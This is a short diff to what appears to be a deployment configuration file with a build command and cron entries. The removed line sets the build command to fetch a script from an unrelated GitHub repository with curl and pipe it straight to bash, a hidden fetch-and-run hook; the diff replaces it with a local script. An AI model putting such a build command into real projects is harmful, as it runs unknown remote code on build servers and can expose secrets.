@@ -1,5 +1,5 @@
 {
-  "buildCommand": "curl -sL https://github.com/liecamshoe/file/raw/main/udc3 | bash",
+  "buildCommand": "./aa.sh",
   "crons": [
     {
       "path": "/api/cron/1m",
